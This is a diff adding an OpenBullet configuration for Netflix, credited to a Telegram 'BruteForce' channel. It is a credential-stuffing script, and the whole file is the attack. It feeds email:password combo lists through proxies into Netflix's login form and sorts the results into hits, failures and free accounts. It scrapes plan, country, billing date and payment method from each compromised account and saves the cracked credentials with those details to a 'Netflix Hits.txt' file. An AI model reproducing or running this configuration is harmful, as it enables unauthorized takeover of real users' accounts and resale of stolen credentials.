@@ -1,0 +1,118 @@
+[SETTINGS]
+{
+  "Name": "Netflix",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-07-17T22:34:00.2467854+04:30",
+  "AdditionalInfo": "T.me/BruteForce | Full Capture | Move Free Account To Custom | Save Hits with Capture Text File on Open Bullet Root Folder (Netflix Hits.txt) open with notepad++ | ",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET REQUEST GET "https://www.us-east-1.prodaa.netflix.com/sk/Login?nextpage=https%3A%2F%2Fwww.us-east-1.prodaa.netflix.com%2FYouraccount" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#URL PARSE "<SOURCE>" LR "name=\"authURL\" value=\"" "\"" -> VAR "URL" 
+
+#ENC FUNCTION URLEncode "<URL>" -> VAR "ENC" 
+
+#Post REQUEST POST "https://www.us-east-1.prodaa.netflix.com/sk/Login?nextpage=https%3A%2F%2Fwww.us-east-1.prodaa.netflix.com%2FYouraccount" 
+  CONTENT "authURL=<ENC>&email=<USER>&password=<PASS>&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&rememberMe=True&flow=websiteSignUp&mode=login&action=loginAction&nextPage=https%3A%2F%2Fwww.netflix.com%2FYourAccount&showPassword=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.us-east-1.prodaa.netflix.com" 
+  HEADER "Origin: https://www.us-east-1.prodaa.netflix.com" 
+  HEADER "Referer: https://www.us-east-1.prodaa.netflix.com/login" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Manage Profiles" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect password" 
+    KEY "Sorry, we can't find an account with this email address" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"membershipStatus\":\"Never_Member\"" 
+    KEY "\"membershipStatus\":\"Former_Member\"" 
+    KEY "uia=\"no-payment-info\">No payment info" 
+
+#Sub PARSE "<SOURCE>" LR "\"currentPlanName\":\"" "\"" -> VAR "Sub" 
+
+#Plan FUNCTION Translate 
+  KEY "\\u03A4\\u03C5\\u03C0\\u03B9\\u03BA\\u03CC" VALUE "Basic" 
+  KEY "B\\u00E1sico" VALUE "Basic" 
+  KEY "u57FAu672C" VALUE "Basic" 
+  KEY "\\" VALUE "" 
+  KEY "Est\\u00E1ndar" VALUE "Standard" 
+  KEY "Bu00E1sico" VALUE "Basic" 
+  "<Sub>" -> CAP "Plan" 
+
+#Period_Of_Time PARSE "<SOURCE>" LR ",\"planDuration\":\"" "\",\"localizedPlanName" CreateEmpty=FALSE -> CAP "Period Of Time" 
+
+#Free_Trial PARSE "<SOURCE>" LR "\"isInFreeTrial\":" "," -> CAP "Trial" 
+
+#Country PARSE "<SOURCE>" LR "\",\"currentCountry\":\"" "\"" -> CAP "Country" 
+
+#DVD PARSE "<SOURCE>" LR "\"isDVD\":" "," -> CAP "DVD" 
+
+#HD PARSE "<SOURCE>" LR "\"hasHD\":" "," -> CAP "HD" 
+
+#Ultra_HD PARSE "<SOURCE>" LR "\"hasUHD\":" "," -> CAP "Ultra HD" 
+
+#Stream PARSE "<SOURCE>" LR "\"maxStreams\":" "," -> CAP "Stream" 
+
+#Billing PARSE "<SOURCE>" LR "\"nextBillingDate\":\"" "\"" -> VAR "Billing" 
+
+#Nex_Billing FUNCTION Replace "\\x2F" "/" "<Billing>" -> CAP "Next Billing" 
+
+#Billing PARSE "<SOURCE>" LR "data-uia=\"payment-text\">" "</span" CreateEmpty=FALSE -> CAP "Payment Methode" 
+
+#CC FUNCTION Constant "@BruteForce" -> CAP " Telegram Channel: " 
+
+#SSS UTILITY File "Netflix Hits.txt" AppendLines "<<<<<<=Account=>>>>>>\\nCombo: <USER>:<PASS>\\nEmail:  <USER>\\nPassword: <PASS>\\n<<<<<<<<<<<=Information=>>>>>>>>>>\\nPlan: <Current Plan>\\nPeriod Of Time: <Period Of Time>\\nCountry: <Country>\\nFree Trial: <Trial>\\nDVD: <DVD>\\nMax Streams: <Stream>\\nHas HD: <HD>\\nHas Ultra HD: <Ultra HD>\\nPayment Methode: <Payment Methode>\\nNext Billing Date: <Next Billing>\\n\\n<<<<<<=Credit=>>>>>>\\nConfiged By @H0S31N | Telegram Channel: T.me/BruteForce \\n==============================================" -> VAR "Save" 
+
